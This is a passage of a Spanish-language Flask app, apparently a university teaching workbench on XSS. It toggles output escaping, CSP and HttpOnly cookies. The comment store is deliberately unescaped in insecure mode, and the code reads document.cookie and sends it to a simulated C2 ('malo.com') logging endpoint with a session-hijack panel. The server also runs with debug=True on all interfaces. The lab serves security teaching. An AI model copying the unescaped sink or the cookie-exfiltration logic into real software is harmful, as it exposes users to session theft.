                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-success fw-bold"><i class="bi bi-shield-check"></i> [PASO 3 - SINK SEGURO]:</span> Se utilizó <code>textContent</code>. El navegador forzó el procesamiento como texto plano inocuo.
                    `;
                    detenerAuto();
                    document.getElementById('btn-next-step').disabled = true;
                    return;
                } else if (info.tipo === 'TEXTO_NORMAL') {
                    setStepStyle(3, 'step-blocked', 'Texto Renderizado');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-info fw-bold"><i class="bi bi-browser-chrome"></i> [PASO 3 - NAVEGADOR]:</span> El navegador renderiza el texto simple en el DOM. No hay código ejecutable. Pulsa F10 para finalizar la auditoría.
                    `;
                } else if (info.tipo === 'HTML_INYECCION') {
                    setStepStyle(3, 'step-bypassed', 'Formato Renderizado');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-warning fw-bold"><i class="bi bi-palette"></i> [PASO 3 - NAVEGADOR]:</span> El parser DOM interpretó las etiquetas HTML de formato (Defacement visual). Pulsa F10 para auditar el impacto.
                    `;
                } else {
                    setStepStyle(3, 'step-vuln', 'Script Ejecutado');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-danger fw-bold"><i class="bi bi-lightning-charge"></i> [PASO 3 - PARSER DOM]:</span> El motor HTML encontró etiquetas ejecutables y corrió el código en el origen de Ana. Pulsa F10 para ver el impacto en el C2.
                    `;
                }
            }
            else if (pasoActual === 4) {
                // PASO 4: IMPACTO / C2
                document.getElementById('arr-3').className = 'pipeline-arrow arrow-passed';

                if (info.tipo === 'TEXTO_NORMAL') {
                    setStepStyle(4, 'step-blocked', 'Sin Impacto');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-success fw-bold">Tráfico Legítimo</span>';
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-success fw-bold"><i class="bi bi-check-circle-fill"></i> [PASO 4 - TRÁFICO NORMAL]:</span> Consulta estándar completada sin incidentes. No se ejecutó código ni se enviaron credenciales al C2.
                    `;
                } else if (info.tipo === 'HTML_INYECCION') {
                    setStepStyle(4, 'step-bypassed', 'Impacto Visual');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-warning fw-bold">Inyección HTML (Sin Scripts)</span>';
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-warning fw-bold"><i class="bi bi-exclamation-circle"></i> [PASO 4 - INYECCIÓN HTML]:</span> La página sufrió alteración visual (Defacement). Al no tener código de robo, el C2 no recibió datos.
                    `;
                } else if (info.tipo === 'XSS_POC') {
                    setStepStyle(4, 'step-vuln', 'Alerta Disparada');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-warning fw-bold">XSS PoC (Alerta)</span>';
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-danger fw-bold"><i class="bi bi-exclamation-triangle-fill"></i> [PASO 4 - PoC EJECUTADO]:</span> Código JavaScript ejecutado en el contexto de Ana (alerta disparada). No se exfiltraron cookies.
                    `;
                } else if (info.tipo === 'ROBO_COOKIE') {
                    setStepStyle(4, 'step-vuln', 'Exfiltrado al C2');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-danger fw-bold">¡COMPROMISO TOTAL!</span>';
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-danger fw-bold"><i class="bi bi-skull"></i> [PASO 4 - COMPROMISO TOTAL]:</span> <code>document.cookie</code> fue leído y transmitido al servidor C2 <code>malo.com</code>.
                    `;
                    // SOLO AQUÍ SE LLAMA A exfiltrarAlC2
                    exfiltrarAlC2(VECTORES_CONFIG[vectorActual].nombre);
                }

                detenerAuto();
                document.getElementById('btn-next-step').disabled = true;
            }

            if (autoTimer && pasoActual < 4 && !MODO_SEGURO) {
                autoTimer = setTimeout(avanzarStepDebugger, 1200);
            }
        }

        function setStepStyle(stepNum, styleClass, text) {
            const el = document.getElementById('step-' + stepNum);
            el.className = 'pipeline-step ' + styleClass;
            document.getElementById('s' + stepNum + '-status').innerText = text;
        }

        function toggleAutoPlay() {
            if (autoTimer) {
                detenerAuto();
            } else {
                document.getElementById('btn-auto').className = 'btn btn-sm btn-light py-0 px-2 fw-bold text-dark';
                autoTimer = setTimeout(avanzarStepDebugger, 350);
            }
        }

        function detenerAuto() {
            if (autoTimer) {
                clearTimeout(autoTimer);
                autoTimer = null;
            }
            document.getElementById('btn-auto').className = 'btn btn-sm btn-outline-light py-0 px-2';
        }

        function resetearDebuggerUI() {
            detenerAuto();
            pasoActual = 0;
            payloadEnEjecucion = '';
            infoPayloadActual = null;
            callbackExito = null;

            for (let i = 1; i <= 4; i++) {
                document.getElementById('step-' + i).className = 'pipeline-step';
            }
            document.getElementById('s1-status').innerText = 'Entrada / URL';
            document.getElementById('s2-status').innerText = 'Filtro / DB';
            document.getElementById('s3-status').innerText = 'Render Cliente';
            document.getElementById('s4-status').innerText = 'Exfiltración C2';

            for (let i = 1; i <= 3; i++) {
                document.getElementById('arr-' + i).className = 'pipeline-arrow';
            }

            document.getElementById('btn-next-step').disabled = true;
            document.getElementById('btn-auto').disabled = true;
            document.getElementById('debug-step-badge').innerText = 'Paso 0 / 4';
            document.getElementById('var-payload').innerText = 'Ninguno en ejecución';
            document.getElementById('var-clasificacion').innerText = 'Esperando ejecución';
            document.getElementById('var-impacto').innerText = 'En espera';
            document.getElementById('debug-log-msg').innerHTML = '<i class="bi bi-info-circle"></i> Pulsa <strong>"🐞 Clic y Depurar Paso a Paso"</strong> para iniciar la auditoría.';
        }

        // ==============================================================
        // COMUNICACIÓN CON EL SERVIDOR ATACANTE C2 (MALO.COM)
        // ==============================================================

        function exfiltrarAlC2(vector) {
            const cookie = document.cookie;
            let datos = '';
            if (!cookie || cookie.trim() === '') {
                datos = '[BLOQUEADO: No hay cookies legibles en JavaScript]';
            } else if (cookie.includes('session_auth_token')) {
                datos = '[CRÍTICO: Token Robado] ' + cookie;
            } else {
                datos = '[DEFENSA ACTIVA: session_auth_token blindado por HttpOnly] Cookies accesibles: ' + cookie;
            }

            fetch('/api/exfiltrar?vector=' + encodeURIComponent(vector) + '&datos=' + encodeURIComponent(datos))
                .then(r => r.json())
                .then(() => actualizarConsolaC2());
        }

        function actualizarConsolaC2() {
            fetch('/api/logs')
                .then(r => r.json())
                .then(logs => {
                    const box = document.getElementById('c2-console');
                    if (logs.length === 0) {
                        box.innerHTML = '<div class="text-secondary">// Esperando conexiones de exfiltración de cookies...</div>';
                        document.getElementById('btn-hijack-session').style.display = 'none';
                        return;
                    }
                    let out = '';
                    let hayTokenRobado = false;
                    logs.forEach(l => {
                        const esBloqueado = l.datos.includes('BLOQUEADO') || l.datos.includes('DEFENSA ACTIVA');
                        if (l.datos.includes('CRÍTICO: Token Robado')) {
                            hayTokenRobado = true;
                        }
                        out += `
                            <div class="terminal-row">
                                <span class="text-secondary">[${l.hora}]</span>
                                <strong class="${esBloqueado ? 'text-info' : 'text-danger'}">[CONEXIÓN]</strong> ${escapeHtml(l.vector)}<br>
                                <span class="text-light">PAYLOAD:</span> <code class="${esBloqueado ? 'text-success' : 'text-warning'}">${escapeHtml(l.datos)}</code>
                            </div>
                        `;
                    });
                    box.innerHTML = out;
                    box.scrollTop = box.scrollHeight;

                    // Si hay token robado, activar botón de Session Hijacking
                    if (hayTokenRobado && !HTTPONLY_ACTIVO) {
                        document.getElementById('btn-hijack-session').style.display = 'inline-block';
                    } else {
                        document.getElementById('btn-hijack-session').style.display = 'none';
                    }
                });
        }

        function toggleSecuestroSesion() {
            sesionSecuestradaVisible = !sesionSecuestradaVisible;
            document.getElementById('hijack-panel').style.display = sesionSecuestradaVisible ? 'block' : 'none';
        }

        function limpiarC2Logs() {
            fetch('/api/limpiar-logs', { method: 'POST' }).then(() => {
                document.getElementById('c2-console').innerHTML = '<div class="text-secondary">// Consola limpia.</div>';
                document.getElementById('btn-hijack-session').style.display = 'none';
                document.getElementById('hijack-panel').style.display = 'none';
                sesionSecuestradaVisible = false;
            });
        }

        function escapeHtml(text) {
            return String(text)
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // Atajo de teclado F10 para avanzar el debugger
        window.addEventListener('keydown', (e) => {
            if (e.key === 'F10' && !document.getElementById('btn-next-step').disabled) {
                e.preventDefault();
                avanzarStepDebugger();
            }
        });

        // Inicialización al cargar la página (recordando la pestaña activa si recargan con F5)
        let tabInicial = 'reflected';
        try {
            const guardado = sessionStorage.getItem('xss_vector_activo');
            if (guardado && VECTORES_CONFIG[guardado]) tabInicial = guardado;
        } catch(e){}
        cambiarVector(tabInicial);
        setInterval(actualizarConsolaC2, 2500);
    </script>
</body>
</html>
"""

# ----------------- ENDPOINTS DEL SERVIDOR FLASK -----------------

@app.route("/")
def index():
    resp = make_response(render_template_string(PLANTILLA_WORKBENCH, 
                                                 configuracion=configuracion, 
                                                 comentarios=comentarios_db, 
                                                 logs=logs_ataques))
    asegurar_cookies(resp)
    aplicar_cabeceras_seguridad(resp)
    return resp

@app.route("/toggle-modo")
def toggle_modo():
    configuracion["modo_seguro"] = not configuracion["modo_seguro"]
    configuracion["csp_activo"] = configuracion["modo_seguro"]
    configuracion["httponly_activo"] = configuracion["modo_seguro"]
    resp = redirect("/")
    resp.set_cookie("session_auth_token", "AUTH_TOKEN_UNICAES_SEC_987654321", 
                    httponly=configuracion["httponly_activo"], samesite="Lax")
    return resp

@app.route("/api/comentario", methods=["POST"])
def api_comentario():
    global comentarios_db
    data = request.get_json() or {}
    autor = data.get("autor", "Anónimo").strip()
    mensaje = data.get("mensaje", "").strip()
    
    if mensaje:
        mensaje = mensaje.replace(r"<\/", "</")
        if configuracion["modo_seguro"]:
            autor = html.escape(autor)
            mensaje = html.escape(mensaje)
        comentarios_db.append({
            "id": len(comentarios_db) + 1,
            "autor": autor if autor else "Atacante n0cturno",
            "mensaje": mensaje,
            "seguro": configuracion["modo_seguro"],
            "fecha": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        })
    return jsonify({"status": "ok", "comentarios": comentarios_db})

@app.route("/api/reset-comentarios", methods=["POST"])
def api_reset_comentarios():
    global comentarios_db
    comentarios_db = [
        {
            "id": 1,
            "autor": "Ing. Catedrático",
            "mensaje": "Bienvenidos al foro de dudas sobre la Tarea 3 de Seguridad Web. Por favor publicar aquí cualquier consulta sobre los ejercicios.",
            "seguro": True,
            "fecha": "11/11/2026 08:30"
        },
        {
            "id": 2,
            "autor": "Carlos Mendoza (Estudiante)",
            "mensaje": "Ingeniero, ¿la entrega incluye la captura de tráfico con Wireshark?",
            "seguro": True,
            "fecha": "11/11/2026 09:15"
        }
    ]
    return jsonify({"status": "ok", "comentarios": comentarios_db})

@app.route("/api/exfiltrar", methods=["GET", "POST"])
def api_exfiltrar():
    global logs_ataques
    vector = request.args.get("vector", "Inyección XSS")
    datos = request.args.get("datos", "Sin datos")
    
    nuevo_log = {
        "hora": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.remote_addr,
        "vector": vector,
        "datos": datos
    }
    logs_ataques.append(nuevo_log)
    if len(logs_ataques) > 25:
        logs_ataques.pop(0)
    return jsonify({"status": "recibido"})

@app.route("/api/logs")
def api_logs():
    return jsonify(logs_ataques)

@app.route("/api/limpiar-logs", methods=["POST"])
def api_limpiar_logs():
    global logs_ataques
    logs_ataques = []
    return jsonify({"status": "limpio"})

def asegurar_cookies(resp):
    # Cookie sensible de sesión: protegida o expuesta según el flag HttpOnly
    resp.set_cookie("session_auth_token", "AUTH_TOKEN_UNICAES_SEC_987654321", 
                    httponly=configuracion["httponly_activo"], samesite="Lax")
    # Cookie de usuario legible para telemetría
    resp.set_cookie("usuario_activo", "ana_villeda_estudiante", httponly=False)

def aplicar_cabeceras_seguridad(resp):
    if configuracion["csp_activo"]:
        resp.headers["Content-Security-Policy"] = (
            "default-src 'self' https://cdn.jsdelivr.net; "
            "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
            "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
            "font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net;"
        )
        resp.headers["X-Content-Type-Options"] = "nosniff"
        resp.headers["X-Frame-Options"] = "DENY"
    return resp

if __name__ == "__main__":
    print("\n========================================================")
    print("  UNICAES | SECURITY WORKBENCH XSS (CWE-79)")
    print("  Autores: Dennis Guevara | Mario Villeda | Luis Balcaceres")
    print("  Servidor iniciado en: http://localhost:5000")
    print("========================================================\n")
    app.run(host="0.0.0.0", port=5000, debug=True)
